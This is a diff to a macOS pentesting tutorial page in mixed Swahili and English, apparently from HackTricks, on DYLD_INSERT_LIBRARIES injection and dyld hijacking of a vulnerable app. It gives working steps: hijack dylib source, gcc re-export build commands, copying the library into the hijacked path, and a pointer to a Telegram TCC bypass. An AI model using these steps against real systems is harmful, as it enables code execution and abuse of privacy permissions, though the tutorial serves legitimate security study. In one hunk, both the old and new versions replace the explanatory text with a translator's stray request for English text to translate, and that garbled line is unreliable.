@@ -2,9 +2,9 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## Mfano wa msingi wa DYLD_INSERT_LIBRARIES
+## DYLD_INSERT_LIBRARIES Basic example
 
-**Library ya ku-inject** ili kutekeleza shell:
+**Library ya kuingiza** ili kutekeleza shell:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -39,7 +39,7 @@ DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
 ## Dyld Hijacking Example
 
-Binary iliyo hatarini inayolengwa ni `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+The vulnerable binary inayolengwa ni `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {{#tabs}}
 {{#tab name="entitlements"}}
@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Kwa maelezo yaliyotangulia, tunajua kwamba **haihakiki signature ya libraries zilizopakiwa** na **inajaribu kupakia library kutoka**:
+Kwa maelezo ya awali tunajua kwamba **haikagui signature ya libraries zilizopakiwa** na **inajaribu kupakia library kutoka**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Kwa hiyo, inawezekana kuiteka! Unda library ambayo **inatekeleza arbitrary code na ku-export functionalities zilezile** za library halali kwa kui-reexport. Na kumbuka kuikompile kwa versions zinazotarajiwa:
+Kwa hiyo, inawezekana ku-hijack! Unda library inayotekeleza **code yoyote** na ku-export functionalities zilezile kama library halali kwa kuire-export. Na kumbuka kui-compile kwa versions zinazotarajiwa:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-Tafadhali bandika maandishi ya Kiingereza unayotaka nitafsiri.
+Tafadhali toa maandishi ya Kiingereza unayotaka nitafsiri.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Njia ya reexport iliyoundwa katika library ni relative kwa loader; hebu tuiibadilishe iwe absolute path ya library ya ku-export:
+Njia ya reexport iliyoundwa kwenye library ni relative kwa loader; hebu tuibadilishe iwe absolute path ya library ya ku-export:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,11 +121,11 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Hatimaye, nakili tu kwenye **eneo lililohijackiwa**:
+Hatimaye, nakili tu kwenye **eneo lililotekwa**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-Na **execute** binary na uhakikishe kuwa **library imepakiwa**:
+Na **tekeleza** binary na uangalie kama **library imepakiwa**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -133,15 +133,15 @@ Na **execute** binary na uhakikishe kuwa **library imepakiwa**:
 </code></pre>
 
 > [!TIP]
-> Maelezo mazuri kuhusu jinsi ya kutumia vulnerability hii vibaya ili kutumia vibaya ruhusa za kamera za Telegram yanaweza kupatikana katika [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
+> Maelezo mazuri kuhusu jinsi ya kutumia vulnerability hii vibaya ili kutumia vibaya ruhusa za camera za telegram yanapatikana kwenye [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
 
-## Kiwango Kikubwa
+## Kwa Kiwango Kikubwa
 
-Ikiwa unapanga kujaribu ku-inject libraries kwenye binaries zisizotarajiwa, unaweza kuangalia event messages ili kubaini library inapopakiwa ndani ya process (katika hali hii, ondoa `printf` na execution ya `/bin/bash`).
+Ikiwa unapanga kujaribu ku-inject libraries kwenye binaries zisizotarajiwa, unaweza kuangalia event messages ili kujua library inapopakiwa ndani ya process (katika hali hii ondoa `printf` na utekelezaji wa `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-## Marejeleo
+## Marejeo
 
 - [1] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 
